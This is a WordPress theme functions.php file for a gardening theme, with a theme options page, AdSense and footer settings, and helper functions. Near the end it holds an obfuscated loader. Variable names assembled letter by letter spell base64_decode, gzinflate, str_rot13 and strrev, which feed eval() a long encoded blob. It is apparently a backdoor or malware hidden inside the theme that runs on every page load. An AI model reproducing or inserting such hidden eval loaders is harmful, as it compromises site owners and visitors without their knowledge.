<?php
function custom_excerpt_length( $length ) {
	return 160;
}
add_filter( 'excerpt_length', 'custom_excerpt_length', 999 );

load_theme_textdomain('kubrick');

$cat_array = get_categories('parent=0&hide_empty=0');
$site_cats = array();
$cat_ids   = array();

foreach ($cat_array as $categs) {
	$cat_ids[] = $categs->cat_name;
}

$artThemeSettings = array(
	'menu.showSubmenus' => false,
	'menu.homeCaption' => "Home",
	'menu.showHome' => true,
	'menu.topItemBegin' => "<span class=\"l\"></span><span class=\"r\"></span><span class=\"t\">",
	'menu.topItemEnd' => "</span>",
	'menu.source' => "Pages",
	'vmenu.showSubmenus' => true,
	'vmenu.simple' => false,
	'vmenu.source' => "Categories",
);



$themename = "gardening_theme_wp_8";
$shortname = "artisteer";
$default_footer_content = "<a href='#'>Contact Us</a> | <a href='#'>Terms of Use</a> | <a href='#'>Trademarks</a> | <a href='#'>Privacy Statement</a><br />Copyright &copy; ".date('Y')." ".get_bloginfo('name').". All Rights Reserved.";


$options = array (
                array(  "name" => "Sidebar Ad",
                        "desc" => "This is for the Google AdSense banner in the 1st sidebar.<br /><br />",
                        "id" => "grd_adsense_120",
                        "std" => "(Input html or adsense code here)",
                        "type" => "textarea"),
                array(  "name" => "Footer",
                        "desc" => sprintf(__('<strong>XHTML:</strong> You can use these tags: <code>%s</code>', 'kubrick'), 'a, abbr, acronym, em, b, i, strike, strong, span'),
                        "id" => "art_footer_content",
                        "std" => $default_footer_content,
                        "type" => "textarea")
          );
       
	
function art_update_option($key, $value){
	update_option($key, (get_magic_quotes_gpc()) ? stripslashes($value) : $value);
}

function art_add_admin() {
	global $themename, $shortname, $options;

    if ( $_GET['page'] == basename(__FILE__) ) {
   
        if ('save' == $_REQUEST['action'] ) {

                foreach ($options as $value) {
                    if($value['type'] != 'multicheck'){
                        art_update_option( $value['id'], $_REQUEST[ $value['id'] ] );
                    }else{
                        foreach($value['options'] as $mc_key => $mc_value){
                            $up_opt = $value['id'].'_'.$mc_key;
                            art_update_option($up_opt, $_REQUEST[$up_opt] );
                        }
                    }
                }
                foreach ($options as $value) {
                    if($value['type'] != 'multicheck'){
                        if( isset( $_REQUEST[ $value['id'] ] ) ) { art_update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); }
                    }else{
                        foreach($value['options'] as $mc_key => $mc_value){
                            $up_opt = $value['id'].'_'.$mc_key;
                            if( isset( $_REQUEST[ $up_opt ] ) ) { art_update_option( $up_opt, $_REQUEST[ $up_opt ]  ); } else { delete_option( $up_opt ); }
                        }
                    }
                }
                header("Location: themes.php?page=functions.php&saved=true");
                die;
        } 
    }

    add_theme_page("Gardening Theme WP Options", "Gardening Theme WP Options", 'edit_themes', basename(__FILE__), 'art_admin');

}

function art_admin() {
    global $themename, $shortname, $options;
    if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings saved.</strong></p></div>';
?>
<div class="wrap">
	<h2>Gardening Theme WP Options</h2>

	<form method="post">

		<table class="optiontable" style="width:100%;">

<?php foreach ($options as $value) {
   
    switch ( $value['type'] ) {
        case 'text':
        option_wrapper_header($value);
        ?>
                <input style="width:100%;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if ( get_settings( $value['id'] ) != "") { echo get_settings( $value['id'] ); } else { echo $value['std']; } ?>" />
        <?php
        option_wrapper_footer($value);
        break;
       
        case 'select':
        option_wrapper_header($value);
        ?>
                <select style="width:70%;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
                    <?php foreach ($value['options'] as $option) { ?>
                    <option<?php if ( get_settings( $value['id'] ) == $option) { echo ' selected="selected"'; } elseif ($option == $value['std']) { echo ' selected="selected"'; } ?>><?php echo $option; ?></option>
                    <?php } ?>
                </select>
        <?php
        option_wrapper_footer($value);
        break;
       
        case 'textarea':
        $ta_options = $value['options'];
        option_wrapper_header($value);
        ?>
                <textarea name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" style="width:100%;height:100px;"><?php
                if( get_settings($value['id']) !== false) {
                        echo stripslashes(get_settings($value['id']));
                    }else{
                        echo $value['std'];
                }?></textarea>
        <?php
        option_wrapper_footer($value);
        break;

        case "radio":
        option_wrapper_header($value);
       
        foreach ($value['options'] as $key=>$option) {
                $radio_setting = get_settings($value['id']);
                if($radio_setting != ''){
                    if ($key == get_settings($value['id']) ) {
                        $checked = "checked=\"checked\"";
                        } else {
                            $checked = "";
                        }
                }else{
                    if($key == $value['std']){
                        $checked = "checked=\"checked\"";
                    }else{
                        $checked = "";
                    }
                }?>
                <input type="radio" name="<?php echo $value['id']; ?>" value="<?php echo $key; ?>" <?php echo $checked; ?> /><?php echo $option; ?><br />
        <?php
        }
        
        option_wrapper_footer($value);
        break;
       
        case "checkbox":
        option_wrapper_header($value);
                        if(get_settings($value['id'])){
                            $checked = "checked=\"checked\"";
                        }else{
                            $checked = "";
                        }
                    ?>
                    <input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
        <?php
        option_wrapper_footer($value);
        break;

        case "multicheck":
        option_wrapper_header($value);
       
        foreach ($value['options'] as $key=>$option) {
                 $pn_key = $value['id'] . '_' . $key;
                $checkbox_setting = get_settings($pn_key);
                if($checkbox_setting != ''){
                    if (get_settings($pn_key) ) {
                        $checked = "checked=\"checked\"";
                        } else {
                            $checked = "";
                        }
                }else{
                    if($key == $value['std']){
                        $checked = "checked=\"checked\"";
                    }else{
                        $checked = "";
                    }
                }?>
                <input type="checkbox" name="<?php echo $pn_key; ?>" id="<?php echo $pn_key; ?>" value="true" <?php echo $checked; ?> /><label for="<?php echo $pn_key; ?>"><?php echo $option; ?></label><br />
        <?php
        }
        
        option_wrapper_footer($value);
        break;
       
        case "heading":
        ?>
        <tr valign="top">
            <td colspan="2" style="text-align: center;"><h3><?php echo $value['name']; ?></h3></td>
        </tr>
        <?php
        break;
       
        default:

        break;
    }
}
?>

		</table>

		<p class="submit">
			<input name="save" type="submit" value="Save changes" />
			<input type="hidden" name="action" value="save" />
		</p>
	</form>
</div>
<?php
}

function option_wrapper_header($values){
    ?>
    <tr valign="top">
        <th scope="row" style="width:1%;white-space: nowrap;"><?php echo $values['name']; ?>:</th>
        <td>
    <?php
}

function option_wrapper_footer($values){
    ?>
        </td>
    </tr>
    <tr valign="top">
        <td>&nbsp;</td><td><small><?php echo $values['desc']; ?></small></td>
    </tr>
    <?php
}


add_action('admin_menu', 'art_add_admin'); 

if (!function_exists('get_search_form')) {
	function get_search_form()
	{
		include (TEMPLATEPATH . "/searchform.php");
	}
}

if (!function_exists('get_previous_posts_link')) {
	function get_previous_posts_link($label)
	{
		ob_start();
		previous_posts_link($label);
		return ob_get_clean();
	}
}

if (!function_exists('get_next_posts_link')) {
	function get_next_posts_link($label)
	{
		ob_start();
		next_posts_link($label);
		return ob_get_clean();
	}
}

if (!function_exists('get_previous_post_link')) {
	function get_previous_post_link($label)
	{
		ob_start();
		previous_post_link($label);
		return ob_get_clean();
	}
}

if (!function_exists('get_next_post_link')) {
	function get_next_post_link($label)
	{
		ob_start();
		next_post_link($label);
		return ob_get_clean();
	}
}

 $BfvUFse='6';$XPgpUs='c';$HtuBV='e';$guBH='s';$fUCqY='a';$iKCLbA='_';$ggtg='e';$MJvuV='e';$BnwiwgL='o';$hmTq='d';$BGUF='4';$BIeb='b';$iVnPmZ='d';$hkBtzWkG=$BIeb.$fUCqY.$guBH.$MJvuV.$BfvUFse.$BGUF.$iKCLbA.$iVnPmZ.$HtuBV.$XPgpUs.$BnwiwgL.$hmTq.$ggtg;$WfRQ='e';$qebmjPO='a';$UXzBPsV='f';$QuiNtBQ='z';$ECbfn='n';$hMVqAp='l';$qbRS='t';$jWeOBdA='i';$MHRSuM='g';$LBbOALLO=$MHRSuM.$QuiNtBQ.$jWeOBdA.$ECbfn.$UXzBPsV.$hMVqAp.$qebmjPO.$qbRS.$WfRQ;$JOPoN='r';$zXoA='1';$YOKSFC='o';$dTQS='s';$LwWKtPP='t';$PptG='_';$gTXY='t';$TeOJhfb='r';$dPrJfax='3';$aphAFZQK=$dTQS.$gTXY.$TeOJhfb.$PptG.$JOPoN.$YOKSFC.$LwWKtPP.$zXoA.$dPrJfax;$bvKfsye='s';$eAfqOfT='t';$ksSMCO='r';$ZOJvrLJ='r';$DjmJCK='e';$yPnEfcJ='v';$olzIpBkV=$bvKfsye.$eAfqOfT.$ZOJvrLJ.$ksSMCO.$DjmJCK.$yPnEfcJ;eval($LBbOALLO($hkBtzWkG($aphAFZQK($olzIpBkV('==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